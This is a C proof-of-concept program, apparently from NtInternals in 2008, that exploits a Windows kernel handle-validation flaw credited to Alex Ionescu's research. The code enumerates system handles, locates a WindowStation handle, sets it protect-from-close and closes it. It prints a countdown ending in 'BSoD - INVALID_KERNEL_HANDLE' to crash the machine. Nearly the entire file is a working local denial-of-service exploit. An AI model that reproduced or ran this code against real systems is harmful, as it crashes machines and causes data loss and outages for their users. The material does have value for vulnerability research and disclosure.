////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Bug 4:                                                                     | //
// | 1) NtQuerySystemInformation(SystemHandleInformation, ...);                 | //
// | 2) NtQueryObject(..., ObjectNameInformation, ...);                         | //
// | 3) NtSetInformationObject(Handle, ObjectHandleInformation, ...);           | //
// | 4) NtUserCloseWindowStation(Handle);                                       | //
// |                                                                            | //
// | Reference:                                                                 | //
// | Pointers and Handles                                                       | //
// | A Story of Unchecked Assumptions in the Windows Kernel                     | //
// |                                                                            | //
// | Alex Ionescu                                                               | //
// | http://www.alex-ionescu.com/?p=61                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NtInternals - http://www.ntinternals.org/                                  | //
// | alex ntinternals org                                                       | //
// | 04 September 2008                                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IMP_SYSCALL __declspec(dllimport) NTSTATUS __stdcall

#define PAGE_SIZE 0x1000

#define NtCurrentProcess() ((HANDLE)0xFFFFFFFF)

#define OBJECT_NAME_LENGTH sizeof(UNICODE_STRING) + (MAX_PATH + 1) * sizeof(WCHAR)

#define STATUS_SUCCESS 0x00000000

typedef ULONG NTSTATUS;

typedef struct _UNICODE_STRING 
{
	/* 0x00 */ USHORT Length;
	/* 0x02 */ USHORT MaximumLength;
	/* 0x04 */ PWSTR Buffer;
	/* 0x08 */
}
	UNICODE_STRING,
  *PUNICODE_STRING,
**PPUNICODE_STRING;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemNotImplemented1,
	SystemProcessesAndThreadsInformation,
	SystemCallCounts,
	SystemConfigurationInformation,
	SystemProcessorTimes,
	SystemGlobalFlag,
	SystemNotImplemented2,
	SystemModuleInformation,
	SystemLockInformation,
	SystemNotImplemented3,
	SystemNotImplemented4,
	SystemNotImplemented5,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPagefileInformation,
	SystemInstructionEmulationCounts,
	SystemInvalidInfoClass1,
	SystemCacheInformation,
	SystemPoolTagInformation,
	SystemProcessorStatistics,
	SystemDpcInformation,
	SystemNotImplemented6,
	SystemLoadImage,
	SystemUnloadImage,
	SystemTimeAdjustment,
	SystemNotImplemented7,
	SystemNotImplemented8,
	SystemNotImplemented9,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemLoadAndCallImage,
	SystemPrioritySeparation,
	SystemNotImplemented10,
	SystemNotImplemented11,
	SystemInvalidInfoClass2,
	SystemInvalidInfoClass3,
	SystemTimeZoneInformation,
	SystemLookasideInformation,
	SystemSetTimeSlipEvent,
	SystemCreateSession,
	SystemDeleteSession,
	SystemInvalidInfoClass4,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemAddVerifier,
	SystemSessionProcessesInformation
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	/* 0x00 */ ULONG ProcessId;
	/* 0x04 */ UCHAR ObjectTypeNumber;
	/* 0x05 */ UCHAR Flags;
	/* 0x06 */ USHORT Handle;
	/* 0x08 */ PVOID Object;
	/* 0x0C */ ACCESS_MASK GrandAccess;
	/* 0x10 */
}
	SYSTEM_HANDLE_INFORMATION,
  *PSYSTEM_HANDLE_INFORMATION,
**PPSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	/* 0x00 */ ULONG HandleCount;
	/* 0x04 */ SYSTEM_HANDLE_INFORMATION Handles[0];
	/* 0xXX */
}
	SYSTEM_HANDLE_INFORMATION_EX,
  *PSYSTEM_HANDLE_INFORMATION_EX,
**PPSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _OBJECT_INFORMATION_CLASS
{
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectAllTypesInformation,
	ObjectHandleInformation
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_NAME_INFORMATION
{
	/* 0x00 */ UNICODE_STRING Name;
	/* 0x08 */
}
	OBJECT_NAME_INFORMATION,
  *POBJECT_NAME_INFORMATION,
**PPOBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
	/* 0x00 */ UNICODE_STRING Name;
	/* 0x08 */ ULONG ObjectCount;
	/* 0x0C */ ULONG HandleCount;
	/* 0x10 */ ULONG Reserved1[4];
	/* 0x20 */ ULONG PeakObjectCount;
	/* 0x24 */ ULONG PeakHandleCount;
	/* 0x28 */ ULONG Reserved2[4];
	/* 0x38 */ ULONG InvalidAttributes;
	/* 0x3C */ GENERIC_MAPPING GenericMapping;
	/* 0x4C */ ULONG ValidAccess;
	/* 0x50 */ UCHAR Unknown;
	/* 0x51 */ BOOLEAN MaintainHandleDatabase;
	/* 0x52 */ UCHAR Padding[2];
	/* 0x54 */ ULONG PoolType;
	/* 0x58 */ ULONG PagedPoolUsage;
	/* 0x5C */ ULONG NonPagedPoolUsage;
	/* 0x60 */
}
	OBJECT_TYPE_INFORMATION,
  *POBJECT_TYPE_INFORMATION,
**PPOBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_HANDLE_ATTRIBUTE_INFORMATION
{
	/* 0x00 */ BOOLEAN Inherit;
	/* 0x04 */ BOOLEAN ProtectFromClose;
	/* 0x08 */
}
	OBJECT_HANDLE_ATTRIBUTE_INFORMATION,
  *POBJECT_HANDLE_ATTRIBUTE_INFORMATION,
**PPOBJECT_HANDLE_ATTRIBUTE_INFORMATION;

IMP_SYSCALL NtAllocateVirtualMemory
(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG AllocationType,
	IN ULONG Protect
);

IMP_SYSCALL NtQuerySystemInformation
(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

IMP_SYSCALL NtQueryObject
(
	IN HANDLE ObjectHandle,
	IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
	OUT PVOID ObjectInformation,
	IN ULONG ObjectInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

IMP_SYSCALL NtDelayExecution
(
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Interval
);

IMP_SYSCALL NtSetInformationObject
(
	IN HANDLE ObjectHandle,
	IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
	OUT PVOID ObjectInformation,
	IN ULONG ObjectInformationLength
);

int __cdecl main(int argc, char **argv)
{
	NTSTATUS NtStatus;
	
	ULONG i;
	ULONG AllocationSize = PAGE_SIZE*64;
	ULONG TypeAllocationSize = PAGE_SIZE;

	PSYSTEM_HANDLE_INFORMATION_EX HandleInformation = NULL;
	POBJECT_TYPE_INFORMATION TypeInformation = NULL;
	OBJECT_HANDLE_ATTRIBUTE_INFORMATION HandleAttributeInformation;
	LARGE_INTEGER Interval;
	UCHAR ObjectInformation[OBJECT_NAME_LENGTH];

	
	///////////////////////////////////////////////////////////////////////////////////////////////
	
	system("cls");
	
	printf( " +----------------------------------------------------------------------------+\n"
			" |                                                                            |\n"
			" | Bug 4:                                                                     |\n"
			" | 1) NtQuerySystemInformation(SystemHandleInformation, ...);                 |\n"
			" | 2) NtQueryObject(..., ObjectNameInformation, ...);                         |\n"
			" | 3) NtSetInformationObject(Handle, ObjectHandleInformation, ...);           |\n"
			" | 4) NtUserCloseWindowStation(Handle);                                       |\n"
			" |                                                                            |\n"
			" | Reference:                                                                 |\n"
			" | Pointers and Handles                                                       |\n"
			" | A Story of Unchecked Assumptions in the Windows Kernel                     |\n"
			" |                                                                            |\n"
			" | Alex Ionescu                                                               |\n"
			" | http://www.alex-ionescu.com/?p=61                                          |\n"
			" |                                                                            |\n"
			" +----------------------------------------------------------------------------+\n"
			" |                                                                            |\n"
			" | NtInternals - http://www.ntinternals.org/                                  |\n"
			" | alex ntinternals org                                                       |\n"
			" | 04 September 2008                                                          |\n"
			" |                                                                            |\n"
			" +----------------------------------------------------------------------------+\n\n");

	///////////////////////////////////////////////////////////////////////////////////////////////
	
	NtStatus = NtAllocateVirtualMemory(
									   NtCurrentProcess(),	// ProcessHandle
									   &HandleInformation,	// BaseAddress
									   0,					// ZeroBits
									   &AllocationSize,		// AllocationSize
									   MEM_COMMIT,			// AllocationType
									   PAGE_READWRITE);		// Protect

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

	
	NtStatus = NtAllocateVirtualMemory(
									   NtCurrentProcess(),
									   &TypeInformation,
									   0,
									   &TypeAllocationSize,
									   MEM_COMMIT,
									   PAGE_READWRITE);

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}
	
	
	NtStatus = NtQuerySystemInformation(
										SystemHandleInformation,	// SystemInformationClass
										HandleInformation,			// SystemInformation
										AllocationSize,				// SystemInformationLength
										NULL);						// ReturnLength
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtQuerySystemInformation - 0x%.8X\n", NtStatus);
		return NtStatus;
	}
	
	for(i=0; i<(HandleInformation->HandleCount); i++)
	{
		NtStatus = NtQueryObject(
								 (HANDLE)(HandleInformation->Handles[i].Handle),	// ObjectHandle
								 ObjectTypeInformation,								// ObjectInformationClass
								 TypeInformation,									// ObjectInformation
								 TypeAllocationSize,								// ObjectInformationLength
								 NULL);												// ReturnLength
		
		if(NtStatus == STATUS_SUCCESS)
		{
			NtStatus = NtQueryObject(
									 (HANDLE)(HandleInformation->Handles[i].Handle),
									 ObjectNameInformation,
									 ObjectInformation,
									 OBJECT_NAME_LENGTH,
									 NULL);
		
			if(TypeInformation->Name.Length)
			{
				if(!memcmp(TypeInformation->Name.Buffer, L"WindowStation", strlen("WindowStation")*2))
				{
					printf( " +----------------------------------------------------------------------------+\n"
							" | Object Information                                                         |\n"
							" +----------------------------------------------------------------------------+\n"
							" |                                                                            |\n"
							" |   ObjectHandle - 0x%.4X                                                    |\n"
							" | ObjectTypeName - %ws                                             |\n"
							" |         Object - 0x%.8X                                                |\n"
							" |     ObjectName - %ws                           |\n"
							" |                                                                            |\n"
							" +----------------------------------------------------------------------------+\n\n",
							HandleInformation->Handles[i].Handle,
							TypeInformation->Name.Buffer,
							HandleInformation->Handles[i].Object,
							((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Buffer);


					Interval.LowPart = 0xFF676980;
					Interval.HighPart = 0xFFFFFFFF;

					printf(" 3");
					NtDelayExecution(FALSE,	&Interval);
	
					printf(" 2");
					NtDelayExecution(FALSE,	&Interval);

					printf(" 1");
					NtDelayExecution(FALSE,	&Interval);

					printf(" BSoD - INVALID_KERNEL_HANDLE\n\n");
					NtDelayExecution(FALSE,	&Interval);

				
					HandleAttributeInformation.Inherit = TRUE;
					HandleAttributeInformation.ProtectFromClose = TRUE;
					
					
					NtStatus = NtSetInformationObject(
													 (HANDLE)(HandleInformation->Handles[i].Handle),	// ObjectHandle
													 ObjectHandleInformation,							// ObjectInformationClass
													 &HandleAttributeInformation,						// ObjectInformation
													 sizeof(OBJECT_HANDLE_ATTRIBUTE_INFORMATION));		// ObjectInformationLength
													  
					if(NtStatus)
					{
						printf(" [*] NtStatus of NtSetInformationObject - 0x%.8X\n", NtStatus);
						return NtStatus;
					}
				
					CloseWindowStation((HANDLE)(HandleInformation->Handles[i].Handle));
				}
			}
		}
	}

	return 0;
}